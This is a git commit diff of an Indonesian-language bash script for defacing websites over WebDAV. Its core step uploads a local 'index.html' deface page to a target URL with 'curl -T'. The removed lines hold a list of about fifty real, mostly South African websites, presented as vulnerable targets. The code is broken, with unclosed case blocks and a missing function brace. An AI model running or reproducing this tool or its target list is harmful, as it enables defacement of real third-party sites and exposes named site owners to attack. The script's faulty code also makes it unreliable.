b5e8cba8c6de02a005a210384d1df22fa14bc39c
tampansky <42198256+tampansky@users.noreply.github.com>
2019-06-15 13:19:07 +0700

    Update Webdav.sh

--- webdav.sh
+++ webdav.sh
@@ -2,7 +2,6 @@
 # Hayoo Mau Ngapain?
 # Pasti Mau Recode ea
 #colors
-clear
 blue='\e[1;34m'
 cyan='\e[0;36m'
 green='\e[0;34m'
@@ -21,123 +20,57 @@ nc="\e[0m"
 red='\e[1;31m'
 yellow='\e[1;33m'
 clear
+#menu
+function menu(){
+    echo -e $Fiuscha "Selamat menggunakan Tools Ini >_<"
+    sleep 0.25
+    echo -e $purple "Silahkan Pilih Daftar List Nya"
+    sleep 0.25
+    echo -e $green "[1.Webdav] $blue [2.Web Vuln Webdav]"
+    echo -e $red "[3.exit]"
+    read TOD 
+    case $TOD in 
+    ("1")
+    sleep 1
+    Webdav
+    ("2")
+    sleep 1
+    webvuln
+    ("3")
+    echo -e "Thanks you mathefakah "
+}
+function Webdav(){
+    echo -e "NOTE: Letakan Script Deface Di Luar Folder"
+    sleep 0.25
+    echo -e "Masukkan Target Webdav"
+    sleep 0.25
+    read "[root@target]>" target
+    echo "menunggu..."
+    sleep 1
+    echo -e "NOTE: File Harus Bernama index.html"
+    echo -e "Masukan Script Deface/file"
+    read "[root@file]>" file
+    sleep 1
+    clear
+    echo -e "Menghubungkan..."
+ curl -T /storage/emulated/0/index.html $target
+}
+function mulai (){
+    echo "Melanjutkan Untuk Memilih"
+    echo "y/n?"
+    echo
+    read lagi
+    if [ $lagi = "y" ]; then
+            menu
+    else
+            echo "Bye Script Kiddies..."
+    fi
 #install
 function Install(){
     pkg install ruby
     gem install lolcat
     pkg install curl
     echo -e $blue "selamat Tools Terinstal"
-}
-function webvuln(){
-echo -e $red "http://bitsandpieces.co.za"
-sleep 0.25
-echo -e $yellow "http://cblandscapes.co.za"
-sleep 0.25
-echo -e $green "http://windmillsandporcupines.co.za"
-sleep 0.25
-echo -e $blue "http://scnc.co.za"
-sleep 0.25
-echo -e $red "http://contsol.co.za"
-sleep 0.25
-echo -e $yellow "http://consultec.co.za"
-sleep 0.25
-echo -e $green "http://colourfactory.co.za"
-sleep 0.25
-echo -e $blue "http://ayk.co.za"
-sleep 0.25
-echo -e $red "http://daretogowildafrica.co.za"
-sleep 0.25
-echo -e $yellow "http://floralandfresh.co.za"
-sleep 0.25
-echo -e $green "http://foodconsult.co.za"
-sleep 0.25
-echo -e $blue "http://itsengineering.co.za"
-sleep 0.25
-echo -e $red "http://hybriddevelopments.co.za"
-sleep 0.25
-echo -e $yellow "http://holotropicbreathwork.co.za"
-sleep 0.25
-echo -e $green "http://hanover-cs.co.za"
-sleep 0.25
-echo -e $blue "http://handj.co.za"
-sleep 0.25
-echo -e $red "http://lwrm.co.za"
-sleep 0.25
-echo -e $red "http://tapifare.com"
-sleep 0.25
-echo -e $red "http://tankertech.co.za"
-sleep 0.25
-echo -e $red "http://tcnig.co.za"
-sleep 0.25
-echo -e $red "http://tcmgroup.co.za"
-sleep 0.25
-echo -e $red "http://tressor.co.za"
-sleep 0.25
-echo -e $red "http://trafficam.co.za"
-sleep 0.25
-echo -e $red "http://tuthukani.co.za"
-sleep 0.25
-echo -e $red "http://nyarhi.co.za"
-sleep 0.25
-echo -e $red "http://digishop.co.za"
-sleep 0.25
-echo -e $red "http://elinemsa.co.za"
-sleep 0.25
-echo -e $red "http://disucctv.co.za"
-sleep 0.25
-echo -e $red "http://www.cai.co.za"
-sleep 0.25
-echo -e $red "http://tirupurjobs.net"
-sleep 0.25
-echo -e $red "http://inlislitev3.perpusnas.go.id"
-sleep 0.25
-echo -e $red "http://clcooling.co.za"
-sleep 0.25
-echo -e $red "http://sublimeconfectionery.co.za"
-sleep 0.25
-echo -e $red "http://gogreenplumbing.co.za"
-sleep 0.25
-echo -e $red "http://golfbuzz.co.za"
-sleep 0.25
-echo -e $red "http://grupo-cma.com"
-sleep 0.25
-echo -e $red "http://inkspot.co.za"
-sleep 0.25
-echo -e $red "http://kgarebana.co.za"
-sleep 0.25
-echo -e $red "http://ittrader.co.za"
-sleep 0.25
-echo -e $red "http://hellomobile.mobi"
-sleep 0.25
-echo -e $red "http://homebuzz.co.za"
-sleep 0.25
-echo -e $red "http://gordonhoward.co.za"
-sleep 0.25
-echo -e $red "http://democonstruction.co.za"
-sleep 0.25
-echo -e $red "http://chasingfantasia.co.za"
-sleep 0.25
-echo -e $red "http://litehouse.co.za"
-sleep 0.25
-echo -e $red "http://ldata.co.za"
-sleep 0.25
-echo -e $red "http://lunique.co.za"
-sleep 0.25
-echo -e $red "http://chillibitez.co.za"
-sleep 0.25
-echo -e $red "http://cmweb.co.za"
-sleep 0.25
-echo -e $red "http://essentialtours.com"
-sleep 0.25
-echo -e $red "http://entitledvip.com"
-sleep 0.25
-echo -e $red "http://frankadesign.com"
-sleep 0.25
-echo -e $red "http://forget-me-not.co.za"
-sleep 0.25
-echo -e $red "http://findpersonnel.co.za"
-sleep 0.25
-echo -e $red "http://everythingdating.co.za"
 }
 #Banner
 function Banner(){
@@ -195,8 +128,10 @@ function Banner(){
             echo -e "|__/|__/\___/_.___/\__,_/\__,_/ |___/ " | lolcat
             sleep 0.25
 }
-#intro
-function intro(){
+install
+clear
+Banner
+echo ""
 echo -e $red "|<=+++++++++++++++=+++++++++++++++=>|"
 sleep 1
 echo -e $blue "+_+                       $purple +_+"
@@ -219,62 +154,5 @@ echo -e $blue "+_+                       $purple +_+"
 sleep 0.25
 echo -e $red "|<=+++++++++++++++=+++++++++++++++=>|"
 sleep 1
-start
-}
-#start
-function start(){
-    echo -e "Lanjutkan Untuk Deface?"
-    echo -e "Ya Atau Tidak?"
-    echo ""
-    read Lanjutkan
-    if [$Lanjutkan = "Ya"];then 
-    menu
-    else 
-    echo "BYE QYMAK..."
-    fi 
-}
-#menu
-function menu(){
-    echo -e $Fiuscha "Selamat menggunakan Tools Ini >_<"
-    sleep 0.25
-    echo -e $purple "Silahkan Pilih Daftar List Nya"
-    sleep 0.25
-    echo -e $green "[1.Webdav] $blue [2.Web Vuln Webdav]"
-    echo -e $red "[3.exit]"
-    read fuck 
-    case $fuck in 
-    ("1")
-    sleep 
-    Webdav
-    ("2")
-    webvuln
-    ("3")
-    echo -e "Thanks you mathefakah "
-}
-function Webdav(){
-    echo -e "NOTE: Letakan Script Deface Di Luar Folder"
-    sleep 0.25
-    echo -e "Masukkan Target Webdav"
-    sleep 0.25
-    read "[root@target]>" target
-    sleep 0.25
-    clear
-    sleep 1
-    echo -e "NOTE: File Harus Bernama index.html"
-    echo -e "Masukan Script Deface/file"
-    read "[root@file]>" file
-    sleep 1
-    clear
-    echo -e "Menghubungkan..."
- curl -T /storage/emulated/0/index.html $target
-}
-install
-sleep 1
-clear
-start
-sleep 1
-clear
-Banner
-sleep 1
-intro
-sleep 1
+mulai
+case
